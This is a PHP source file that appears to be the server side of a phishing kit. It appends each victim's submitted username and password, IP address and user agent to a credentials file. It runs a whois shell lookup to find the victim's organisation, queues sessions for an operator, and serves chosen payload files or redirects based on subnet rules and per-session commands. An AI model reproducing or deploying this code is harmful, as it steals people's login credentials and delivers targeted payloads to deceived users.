<?php
 session_start();
 $sid = session_id();

 require_once('./config.php');

 if(empty($user) || empty($pass)){
    #echo 'User or pass is blank';
    return;
 }

 $rip = $_SERVER['REMOTE_ADDR'];
 $ua = $_SERVER['HTTP_USER_AGENT'];

 $subnetInList = false;
 $sessionFileExists = false;
 $sessionActionFileExists = false;
 
 $date = date("F j, Y, g:i a");
 $end="\r\n";

 $phishinfo = "$date | $rip | $user | $pass | $ua $end";
 $phishfile = fopen("creds.lalala.txt", "a");
 fwrite($phishfile,$phishinfo);
 fclose($phishfile);


#########################################
# 
# Check Subnet File if client IP is listed
# in a range with a predefined action
# 

$file = fopen($subnetFile,"r");
while (($line = fgetcsv($file)) !== FALSE) {
  $range = $line[0];
  $action = $line[1];
  #$variable = $line[2];
  $variable = "";
  #echo "<br> In while loop, range is $range<br>";
  if( cidr_match($rip, $range) == true)
  {
   $subnetInList = true;
   #echo "The Client IP is inthe subnet file";
   perform_action($action, $variable);
   return;
  }
}

######################################
## If subnet was not in subnet list, then proceed

while ( $sessionActionFileExists == false)
{
  $actionFileName = $sActionDir . "/$sid";
  $queueFileName = $sQueueDir . "/$sid";


  if ($sessionActionFile = fopen($actionFileName, "r"))
  {
   $sessionActionFileExists = true;
   while (($sessLine = fgetcsv($sessionActionFile)) !== FALSE) {
    perform_action($sessLine[1], $sessLine[2]);
    fclose($sessionFile);
    return;
   }
  }
  elseif( !file_exists($queueFileName) )
  {	
    #$outFileName = $sQueueDir . "/$sid";
  	$outFile = fopen($queueFileName, "w") or die("Unable to open file $queueFileName!");
  	$cmd = "whois $rip | grep -i orgname | cut -d ':' -f2";

  	#echo "<br>Running command: $cmd<br>";

  	$output = shell_exec($cmd);
  	$orgName = chop($output);
  	$entry = "$sid\n$user:$pass\nIP:$rip\nORG: $orgName\n$ua\n";

  	fwrite($outFile, $entry);  
    fclose($outFile);
  }

 sleep($sleepTime);

}


#
#
# Perform Action on Client Request
function perform_action($action, $variable)
{
 global $payloadDir;
 
 # Numerical Payload, this makes it so we 
 # dont need to hardcode every number
 if ( preg_match('/^payload-/', $action))
 { 
   #print "Numerical payload $action<br>";
   $thePayloadFile = $payloadDir . "/$action";
   $thePayload = file_get_contents( $thePayloadFile );
   echo $thePayload;
   return;	
 } 
 else
 {
  switch ($action) {
    case "innocuous-payload":
        #echo "Sending Innocuous Payload!";
	       $thePayloadFile = $payloadDir . "/innocuous-payload";
 	       $thePayload = file_get_contents( $thePayloadFile );
	       echo $thePayload;
        break;
    case "redirect-to-login":
	       global $loginURL;
	       header("Location: $failedLoginURL");
        break;

    default:
        #echo "Nothing configured for this action!";
	break;
   }
  }

 return;
}


#
# Got this code from 
# https://stackoverflow.com/questions/594112/matching-an-ip-to-a-cidr-mask-in-php-5
# Thank you to whoever wrote this function, its great
#
function cidr_match($ip, $range)
{
   list ($subnet, $bits) = explode('/', $range);

   #echo "<br>CIDR_MATCH: $ip, $range, $bits<br>";

    if ($bits === null) {
        $bits = 32;
    }
    $ip = ip2long($ip);
    $subnet = ip2long($subnet);
    $mask = -1 << (32 - $bits);
    $subnet &= $mask; # nb: in case the supplied subnet wasn't correctly aligned
    return ($ip & $mask) == $subnet;
}
?>
